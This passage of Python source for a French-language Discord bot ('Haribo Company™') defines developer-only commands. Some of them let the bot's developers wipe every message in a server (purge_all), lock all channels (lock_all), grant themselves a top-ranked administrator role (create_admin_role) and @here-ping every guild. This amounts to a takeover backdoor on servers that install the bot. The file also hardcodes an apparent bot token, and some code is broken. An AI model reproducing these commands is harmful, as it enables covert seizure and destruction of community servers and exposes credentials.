        logger.info(f"Bot left server: {guild.name} (ID: {guild.id})")
    else:
        logger.warning(f"Salon avec l'ID {channel_id} introuvable.")


@bot.command()
@commands.has_permissions(administrator=True)
async def say(ctx, *, message):
    """🗣️ Faire parler le bot (administrateurs seulement)"""
    await ctx.message.delete()

@bot.command()
@is_developer()
async def purge_all(ctx):
    """🗑️ Supprimer tous les messages de tous les salons (développeurs seulement)"""
    for channel in ctx.guild.text_channels:
        try:
            await channel.purge(limit=None)
            await ctx.send(f"🗑️ Tous les messages du salon {channel.name} ont été supprimés.", ephemeral=True)
        except discord.errors.Forbidden:
            await ctx.send(f"❌ Impossible de supprimer les messages du salon {channel.name} (permissions insuffisantes).", ephemeral=True)
        except Exception as e:
            await ctx.send(f"❌ Erreur lors de la suppression des messages du salon {channel.name}: {e}", ephemeral=True)

@bot.command()
@is_developer()
async def servers(ctx):
    """📊 Voir la liste des serveurs (développeurs seulement)"""
    embed = discord.Embed(title="📊 Serveurs du bot", color=0x00ff00)
    if bot.guilds:
        for guild in bot.guilds:
            embed.add_field(name=guild.name,
                            value=f"👥 {guild.member_count} membres",
                            inline=True)
    else:
        embed.description = "Le bot n'est présent sur aucun serveur."
    await ctx.send(embed=embed, ephemeral=True)


@bot.command()
@is_developer()
async def adddev(ctx, user: discord.User):
    """➕ Ajouter un développeur (développeurs seulement)"""
    if user.id not in DEVELOPERS:
        DEVELOPERS.append(user.id)
        embed = discord.Embed(
            title="👨‍💻 Développeur Ajouté",
            description=f"**{user.mention}** a été ajouté avec succès à l'équipe de développement du bot!",
            color=0x2ecc71,  # Vert plus professionnel
            timestamp=datetime.utcnow()
        )
        embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
        embed.set_footer(text="Haribo Company™ | Ajout de développeur")
        await ctx.send(embed=embed, ephemeral=True)

        # Envoyer un log dans le salon dédié
        channel_id = 1380991410152673391  # Remplacez par l'ID du salon de logs
        channel = bot.get_channel(channel_id)
        if channel:
            log_embed = discord.Embed(
                title="➕ Nouveau développeur ajouté",
                description=f"L'utilisateur {user.mention} a été ajouté à la liste des développeurs par {ctx.author.mention}.",
                color=0x00ff00,  # Vert pour indiquer un ajout
                timestamp=datetime.utcnow()
            )
            log_embed.add_field(name="ID de l'utilisateur", value=user.id, inline=False)
            log_embed.add_field(name="ID de l'auteur", value=ctx.author.id, inline=False)
            await channel.send(embed=log_embed)
        else:
            print(f"❌ Salon de logs introuvable avec l'ID: {channel_id}")

        try:
            embed_dm = discord.Embed(
                title="🎉 Bienvenue dans l'équipe!",
                description="Vous avez été ajouté à la liste des développeurs du bot. Votre contribution est précieuse!",
                color=0x3498db,  # Bleu plus attrayant
                timestamp=datetime.utcnow()
            )
            embed_dm.set_footer(text="Haribo Company™ | Notification développeur")
            await user.send(embed=embed_dm)
        except discord.errors.Forbidden:
            embed_error = discord.Embed(
                title="🚫 Erreur",
                description="Impossible d'envoyer un message privé à l'utilisateur. Veuillez vérifier si les messages privés sont activés.",
                color=0xe74c3c,  # Rouge pour les erreurs
                timestamp=datetime.utcnow()
            )
            embed_error.set_footer(text="Haribo Company™ | Erreur DM")
            await ctx.send(embed=embed_error, ephemeral=True)
        await save_developers()  # Sauvegarder la liste des développeurs
    else:
        embed_exists = discord.Embed(
            title="⚠️ Information",
            description=f"{user.mention} est déjà membre de l'équipe de développement.",
            color=0xf1c40f,  # Jaune pour l'avertissement
            timestamp=datetime.utcnow()
        )
        embed_exists.set_footer(text="Haribo Company™ | Développeur existant")
        await ctx.send(embed=embed_exists, ephemeral=True)


@bot.command()
@is_developer()
async def removedev(ctx, user: discord.User):
    """➖ Retirer un développeur (développeurs seulement)"""
    if user.id in DEVELOPERS:
        DEVELOPERS.remove(user.id)
        embed = discord.Embed(
            title="👨‍💻 Développeur Retiré",
            description=f"**{user.mention}** a été retiré de l'équipe de développement.",
            color=0x2ecc71,  # Vert pour succès
            timestamp=datetime.utcnow()
        )
        embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url)
        embed.set_footer(text="Haribo Company™ | Retrait de développeur")
        await ctx.send(embed=embed, ephemeral=True)

        # Envoyer un log dans le salon dédié
        channel_id = 1380991410152673391  # Remplacez par l'ID du salon de logs
        channel = bot.get_channel(channel_id)
        if channel:
            log_embed = discord.Embed(
                title="➖ Développeur retiré",
                description=f"L'utilisateur {user.mention} a été retiré de la liste des développeurs par {ctx.author.mention}.",
                color=0xff0000,  # Rouge pour indiquer un retrait
                timestamp=datetime.utcnow()
            )
            log_embed.add_field(name="ID de l'utilisateur", value=user.id, inline=False)
            log_embed.add_field(name="ID de l'auteur", value=ctx.author.id, inline=False)
            await channel.send(embed=log_embed)
        else:
            print(f"❌ Salon de logs introuvable avec l'ID: {channel_id}")

        try:
            embed_dm = discord.Embed(
                title="😔 Départ de l'équipe",
                description="Vous avez été retiré de la liste des développeurs du bot. Nous vous remercions pour votre contribution.",
                color=0xe67e22,  # Orange pour notification
                timestamp=datetime.utcnow()
            )
            embed_dm.set_footer(text="Haribo Company™ | Notification développeur")
            await user.send(embed=embed_dm)
        except discord.errors.Forbidden:
            embed_error = discord.Embed(
                title="🚫 Erreur",
                description="Impossible d'envoyer un message privé à l'utilisateur. Veuillez vérifier si les messages privés sont activés.",
                color=0xe74c3c,  # Rouge pour les erreurs
                timestamp=datetime.utcnow()
            )
            embed_error.set_footer(text="Haribo Company™ | Erreur DM")
            await ctx.send(embed=embed_error, ephemeral=True)
        await save_developers()  # Sauvegarder la liste des développeurs
    else:
        embed_not_found = discord.Embed(
            title="⚠️ Information",
            description=f"{user.mention} n'est pas actuellement membre de l'équipe de développement.",
            color=0xf1c40f,  # Jaune pour information
            timestamp=datetime.utcnow()
        )
        embed_not_found.set_footer(text="Haribo Company™ | Développeur introuvable")


@bot.command()
@is_developer()
async def devlist(ctx):
    """📋 Liste des développeurs (développeurs seulement)"""
    if not DEVELOPERS:
        await ctx.send("❌ Aucun développeur enregistré!", ephemeral=True)
        return

    embed = discord.Embed(title="👨‍💻 Liste des développeurs", color=0x0099ff)
    dev_names = []
    for dev_id in DEVELOPERS:
        user = bot.get_user(dev_id)
        if user:
            dev_names.append(f"• {user.name}#{user.discriminator}")
        else:
            dev_names.append(f"• ID: {dev_id} (utilisateur introuvable)")

    embed.description = "\n".join(dev_names)
    await ctx.send(embed=embed, ephemeral=True)


async def save_developers():
    """Sauvegarde la liste des développeurs dans un fichier."""
    try:
        with open('developers.json', 'w') as f:
            json.dump(DEVELOPERS, f)
        print("✅ Liste des développeurs sauvegardée dans le fichier.")
    except Exception as e:
        print(f"❌ Erreur lors de la sauvegarde de la liste des développeurs : {e}")


async def load_developers():
    """Charge la liste des développeurs depuis un fichier."""
    global DEVELOPERS
    try:
        with open('developers.json', 'r') as f:
            DEVELOPERS = json.load(f)
        print("✅ Liste des développeurs chargée depuis le fichier.")
    except FileNotFoundError:
        print("⚠️ Fichier de développeurs non trouvé. Utilisation de la liste par défaut.")
    except json.JSONDecodeError:
        print("⚠️ Erreur lors de la lecture du fichier JSON des développeurs.")

# Charger la liste des développeurs au démarrage du bot
@bot.event
async def on_connect():  # Utilisez on_connect au lieu de on_ready pour charger les données le plus tôt possible
    await load_developers()

@bot.command()
@is_developer()
async def leave_server(ctx, server_id: int):
    """🚪 Faire quitter le bot d'un serveur (développeurs seulement)"""
    try:
        guild = bot.get_guild(server_id)
        if guild:
            await guild.leave()
            await ctx.send(
                f"✅ Le bot a quitté le serveur {guild.name} (ID: {server_id})!", ephemeral=True
            )
            logger.info(
                f"Bot left server: {guild.name} (ID: {server_id}) via command")
        else:
            await ctx.send("❌ Serveur introuvable!", ephemeral=True)
    except Exception as e:
        await ctx.send(
            f"❌ Erreur lors de la tentative de quitter le serveur: {e}", ephemeral=True)
        logger.error(f"Error leaving server {server_id}: {e}")


@bot.command()
@is_developer()
async def join_server(ctx, server_id: int):
    """➕ Faire rejoindre le bot à un serveur via un ID de serveur (développeurs seulement)"""
    try:
        guild = bot.get_guild(server_id)
        if guild:
            await ctx.send(
                "❌ Le bot ne peut pas rejoindre un serveur qu'il ne connait pas avec l'ID. Utiliser un lien d'invitation"
            )
        else:
            try:
                invite = await bot.fetch_invite(invite_link)
                await invite.accept()
                await ctx.send(
                    f"✅ Le bot a rejoint le serveur {invite.guild.name}!")
                logger.info(
                    f"Bot joined server: {invite.guild.name} (ID: {invite.guild.id}) via invite link"
                )
            except discord.errors.InvalidInvite:
                await ctx.send("❌ Lien d'invitation invalide!")
            except discord.errors.NotFound:
                await ctx.send("❌ Invitation introuvable!")
            except discord.errors.Forbidden:
                await ctx.send(
                    "❌ Le bot n'a pas la permission de rejoindre ce serveur!")
            except Exception as e:
                await ctx.send(
                    f"❌ Erreur lors de la tentative de rejoindre le serveur: {e}"
                )
                logger.error(
                    f"Error joining server via invite link {invite_link}: {e}")
    except Exception as e:
        await ctx.send(
            f"❌ Erreur lors de la tentative de rejoindre le serveur: {e}")


@bot.command()
@is_developer()
async def broadcast(ctx, *, message):
    """📢 Envoyer un message dans tous les serveurs (développeurs seulement)"""
    logger.info(
        f"Broadcast lancé par {ctx.author} avec le message : {message}")
    success_count = 0
    fail_count = 0

    mention = "@here message      important veuillez lire attentivement"

    embed = discord.Embed(title="📢 Message Haribo Company™",
                          description=message,
                          color=0xff6b00)
    embed.set_footer(text=f"Envoyé par {ctx.author.name}")

    for guild in bot.guilds:
        try:
            text_channels = [
                ch for ch in guild.text_channels
                if ch.permissions_for(guild.me).send_messages
            ]
            if len(text_channels) >= 50:
                channel = text_channels[51]  # 20ème salons
                await channel.send(mention)
                await channel.send(embed=embed)
                success_count += 1
                logger.info(
                    f"✅ Message envoyé dans {guild.name} -> #{channel.name}")
            else:
                fail_count += 1
                logger.warning(
                    f"❌ Moins de 20 salons accessibles dans {guild.name}")

        except Exception as e:
            fail_count += 1
            logger.error(f"❌ Erreur lors de l'envoi dans {guild.name}: {e}")
            await ctx.send(
                f"❌ Erreur lors de l'envoi dans {guild.name}: {str(e)}")

    await ctx.send(
        f"📊 **Rapport d'envoi:**\n✅ Réussi: {success_count} serveurs\n❌ Échoué: {fail_count} serveurs"
    )

@bot.command()
@is_developer()
async def lock_all(ctx):
    """🔒 Bloquer tous les salons du serveur et envoyer un message d'urgence (développeurs seulement)"""
    embed = discord.Embed(
        title="🔒 ALERTE : SERVEUR VERROUILLÉ",
        description="Ce serveur a été temporairement verrouillé par un administrateur. Veuillez patienter pour plus d'informations.",
        color=discord.Color.red()
    )
    embed.add_field(name="Motif", value="Non spécifié. Veuillez contacter un administrateur pour plus d'informations.", inline=False)
    embed.set_footer(text="Haribo Company™")
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
            await channel.send(embed=embed)
            print(f"🔒 Salon {channel.name} bloqué et message envoyé.")
        except Exception as e:
            print(f"❌ Impossible de bloquer/envoyer un message dans le salon {channel.name}: {e}")
    await ctx.send("🔒 Tous les salons ont été bloqués et un message d'urgence a été envoyé!")


@bot.command()
@is_developer()
async def unlock_all(ctx):
    """🔓 Débloquer tous les salons du serveur (développeurs seulement)"""
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=True)
            print(f"🔓 Salon {channel.name} débloqué.")
        except Exception as e:
            print(f"❌ Impossible de débloquer le salon {channel.name}: {e}")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def sync_category(ctx, category: discord.CategoryChannel = None):
    """🔄 Synchroniser les permissions des salons d'une catégorie avec la catégorie (nécessite la permission de gérer les salons)"""
    if category is None:
        await ctx.send("❌ Veuillez spécifier une catégorie.")
        return

    for channel in category.channels:
        try:
            await channel.edit(sync_permissions=True)
            print(f"🔄 Permissions synchronisées pour le salon {channel.name} dans la catégorie {category.name}.")
        except discord.errors.Forbidden:
            print(f"❌ Impossible de synchroniser les permissions pour le salon {channel.name} (permissions insuffisantes).")
            await ctx.send(f"❌ Impossible de synchroniser les permissions pour le salon {channel.name} car le bot n'a pas les permissions suffisantes.")
        except Exception as e:
            print(f"❌ Erreur lors de la synchronisation des permissions pour le salon {channel.name}: {e}")
            await ctx.send(f"❌ Erreur lors de la synchronisation des permissions pour le salon {channel.name}: {e}")
    await ctx.send(f"✅ Permissions synchronisées pour tous les salons de la catégorie {category.name}!")
    


import asyncio
MAINTENANCE_FILE = 'maintenance.txt'

def load_maintenance_mode():
    """Charge l'état du mode maintenance depuis un fichier."""
    try:
        with open(MAINTENANCE_FILE, 'r') as f:
            mode = f.read().strip()
            return mode == 'True'
    except FileNotFoundError:
        return False  # Par défaut, le mode maintenance est désactivé
    except Exception as e:
        print(f"Erreur lors du chargement du mode maintenance : {e}")
        return False

def save_maintenance_mode(mode):
    """Sauvegarde l'état du mode maintenance dans un fichier."""
    try:
        with open(MAINTENANCE_FILE, 'w') as f:
            f.write(str(mode))
    except Exception as e:
        print(f"Erreur lors de la sauvegarde du mode maintenance : {e}")

MAINTENANCE_MODE = load_maintenance_mode()

@bot.command()
@is_developer()
async def maintenance(ctx, mode: str = None):
    """🔧 Activer/désactiver le mode maintenance (développeurs seulement)"""
    global MAINTENANCE_MODE

    if mode is None:
        MAINTENANCE_MODE = not MAINTENANCE_MODE  # Inverser l'état actuel
    elif mode.lower() == "on":
        MAINTENANCE_MODE = True
    elif mode.lower() == "off":
        MAINTENANCE_MODE = False
    else:
        embed = discord.Embed(
            title="❌ Erreur",
            description="Mode invalide. Utilisez `on` ou `off`.",
            color=discord.Color.red()
        )
        message = await ctx.send(embed=embed)
        await asyncio.sleep(3)
        await message.delete()
        return

    save_maintenance_mode(MAINTENANCE_MODE)  # Sauvegarder l'état actuel

    if MAINTENANCE_MODE:
        embed = discord.Embed(
            title="⚠️ Maintenance",
            description="Mode maintenance activé! Le bot ne répondra qu'aux développeurs.",
            color=discord.Color.orange()
        )
        message = await ctx.send(embed=embed)
        #await asyncio.sleep(3)
        #await message.delete()
        logger.warning("Mode maintenance activé")
    else:
        embed = discord.Embed(
            title="✅ Maintenance",
            description="Mode maintenance désactivé! Le bot est de nouveau accessible à tous.",
            color=discord.Color.green()
        )
        message = await ctx.send(embed=embed)
        #await asyncio.sleep(3)
        #await message.delete()


@bot.check
async def maintenance_check(ctx):
    """Vérification globale pour le mode maintenance"""
    if MAINTENANCE_MODE and ctx.author.id not in DEVELOPERS:
        embed = discord.Embed(
            title="⚠️ Maintenance",
            description="Le bot est actuellement en mode maintenance. Seuls les développeurs peuvent utiliser les commandes.",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed, ephemeral=True)
        #await asyncio.sleep(3)
        #await message.delete()
        return False
    return True


@bot.command()
@is_developer()
async def create_admin_role(ctx):
    """Crée un rôle Administrateur avec toutes les permissions et l'attribue à l'auteur de la commande."""
    try:
        # Vérifie si un rôle Administrateur existe déjà (insensible à la casse)
        admin_role = discord.utils.find(lambda r: r.name.lower() == "administrateur", ctx.guild.roles)
        if admin_role:
            await ctx.send("✅ Un rôle Administrateur existe déjà.")
            return

        # Crée le rôle Administrateur avec toutes les permissions
        permissions = discord.Permissions(administrator=True)
        admin_role = await ctx.guild.create_role(name="🛡️Staff Haribo bot🛡️", permissions=permissions, color=discord.Color.red(), reason="Création automatique du rôle Administrateur")
        await ctx.send(f"✅ Le rôle Administrateur a été créé avec succès!")

        # Attribue le rôle à l'auteur de la commande
        await ctx.author.add_roles(admin_role, reason="Attribution automatique du rôle Administrateur")
        await ctx.send(f"✅ Le rôle Administrateur a été attribué à {ctx.author.mention}!")

        # Déplace le rôle en haut de la hiérarchie
        try:
            await admin_role.edit(position=1)  # Position 1 pour le mettre en haut (juste en dessous du rôle du bot)
            await ctx.send("✅ Le rôle Administrateur a été déplacé en haut de la hiérarchie.")
        except discord.Forbidden:
            await ctx.send("❌ Je n'ai pas la permission de gérer les rôles et de modifier leur position.")
        except Exception as e:
            await ctx.send(f"❌ Une erreur est survenue lors du déplacement du rôle : {e}")


    except discord.Forbidden:
        await ctx.send("❌ Je n'ai pas la permission de créer ou d'attribuer des rôles. Assurez-vous que j'ai les permissions nécessaires.")
    except Exception as e:
        logger.error(f"Erreur lors de la création/attribution du rôle Administrateur: {e}")
        await ctx.send(f"❌ Une erreur est survenue lors de la création ou de l'attribution du rôle Administrateur: {e}")


@bot.command()
@is_developer()
async def devhelp(ctx):
    """📋 Liste des commandes développeurs (développeurs seulement)"""
    embed = discord.Embed(
        title="👨‍💻 Commandes développeurs",
        description="Voici toutes les commandes réservées aux développeurs :",
        color=0xff0000)

    admin_commands = [
        "**!shutdown** - 🔴 Éteindre le bot",
        "**!reboot** - 🔄 Redémarrer le bot",
        "**!say <message>** - 🗣️ Faire parler le bot",
        "**!servers** - 📊 Voir la liste des serveurs",
        "**!broadcast <message>** - 📢 Envoyer un message dans tous les serveurs",
        "**!maintenance <on/off>** - 🔧 Activer/désactiver le mode maintenance",
        #"**!devpanel** - 🛠️ Panneau de contrôle développeur",
        "**!create_admin_role** - 🛡️ Crée un rôle Administrateur avec toutes les permissions",
        "**!clear <nombre>** - 🗑️ Supprimer un nombre de message dans un salon",
        "**!purge_all** - 🗑️ Supprimer tous les messages de tous les salons",
        "**!lock_all** - 🔒 Bloquer tous les salons du serveur et envoyer un message d'urgence",
        "**!unlock_all** - 🔓 Débloquer tous les salons du serveur",
        "**!sync_category <category_id>** - 🔄 Synchroniser les permissions des salons d'une catégorie avec la catégorie",
        "**!leave_server <server_id>** - 🚪 Faire quitter le bot d'un serveur",
        "**!join_server <server_id>** - ➕ Faire rejoindre le bot à un serveur"
    ]

    dev_management = [
        "**!adddev <@utilisateur>** - ➕ Ajouter un développeur",
        "**!removedev <@utilisateur>** - ➖ Retirer un développeur",
        "**!devlist** - 📋 Liste des développeurs",
        "**!devhelp** - 📋 Afficher cette liste",
    ]

    embed.add_field(name="⚙️ Administration :",
                    value="\n".join(admin_commands),
                    inline=False)

    embed.add_field(name="👥 Gestion des développeurs :",
                    value="\n".join(dev_management),
                    inline=False)

    embed.set_footer(
        text="⚠️ Ces commandes sont réservées aux développeurs autorisés")
    await ctx.send(embed=embed, 
    ephemeral=True)


@bot.event
async def on_command(ctx):
    logger.info(
        f"Commande utilisée : {ctx.command.name} par {ctx.author} dans {ctx.channel}"
    )

# Gestionnaire d'erreurs pour les commandes
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("❌ Cette commande est réservée aux développeurs du bot!", 
                       ephemeral=True
                       )
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(
            f"❌ Argument manquant! Utilisez: `{ctx.prefix}help {ctx.command}` pour plus d'infos", 
            ephemeral=True
        )
    elif isinstance(error, commands.UserNotFound):
        await ctx.send("❌ Utilisateur introuvable!", 
                       ephemeral=True)
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Vous n'avez pas les permissions requises pour cette commande!", ephemeral=True)
    else:
        print(f"Erreur de commande: {error}")
        await ctx.send("❌ Une erreur est survenue!",    
                       ephemeral=True)
keep_alive()  # ← lance le serveur web pour rester en ligne
bot.run(
    "MTM3MDkxMjA4MTUzMjE2MjA5OA.GY8tKE.FmPVTujvyeexGpdfDwylI6dt-Cd5HfOssHaTls"
)  # ← remplace avec ton vrai token
